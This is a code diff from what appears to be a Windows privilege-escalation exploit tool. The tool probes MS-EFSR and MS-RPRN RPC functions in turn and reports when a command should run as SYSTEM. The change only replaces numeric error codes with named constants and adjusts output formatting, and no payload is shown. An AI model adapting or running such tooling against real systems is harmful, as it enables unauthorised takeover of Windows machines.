@@ -51,20 +51,17 @@ wchar_t* generateRandomString() {
 void handleError(const wchar_t* function, long result) {
     wprintf(L"[error] %ls returned (%d): %ls\r\n", function, result, lookup_error_with_nameW(result));
 
-    if (result == 53) {
-        wprintf(L" -> [+] Exploit worked, it should execute your command as SYSTEM!\r\n");
+    if ((result == WIN32ERR_ERROR_BAD_NETPATH) or (result == WIN32ERR_ERROR_SUCCESS)) {
+        wprintf(L"|--> [+] Exploit worked, it should execute your command as SYSTEM!\r\n");
     }
-    else if (result == 5) {
-        wprintf(L" -> [-] Access Denied requiring more privileges, trying another one ...\r\n");
+    else if (result == WIN32ERR_ERROR_ACCESS_DENIED) {
+        wprintf(L"|--> [-] Access Denied requiring more privileges, trying another one ...\r\n");
     }
-    else if (result == 50) {
-        wprintf(L" -> [-] RPC function probably not implemented on this system, trying another one ...\r\n");
-    }
-    else if (result == 0) {
-        wprintf(L" -> [+] Exploit worked, it should execute your command as SYSTEM!\r\n");
+    else if (result == WIN32ERR_ERROR_NOT_SUPPORTED) {
+        wprintf(L"|--> [-] RPC function probably not implemented on this system, trying another one ...\r\n");
     }
     else {
-        wprintf(L" -> [-] Exploit failed, unknown error, trying another function ...\r\n");
+        wprintf(L"|--> [-] Exploit failed, unknown error, trying another function ...\r\n");
     }
 }
 
@@ -333,7 +330,7 @@ long CallEfsrFunctions(RPC_BINDING_HANDLE Binding, int exploitID, bool force, st
     if (exploitID == -1) {
         wprintf(L"[MS-EFSR] Starting RPC functions fuzzing ...\r\n");
         for (int i = 0; i < sizeOfFunctions; i++) {
-            wprintf(L" [MS-EFSR] ");
+            wprintf(L"[MS-EFSR] ");
             result = functions[i]();
 
             handleError(functionNames[i], result);
@@ -381,7 +378,7 @@ long callRprnFunctions(int exploitID, bool force, std::wstring randomNamedpipe) 
     if (exploitID == -1) {
         wprintf(L"[MS-RPRN] Starting RPC functions fuzzing ...\r\n");
         for (int i = 0; i < sizeOfFunctions; i++) {
-            wprintf(L" [MS-RPRN] ");
+            wprintf(L"[MS-RPRN] ");
             result = functions[i]();
 
             handleError(functionNames[i], result);
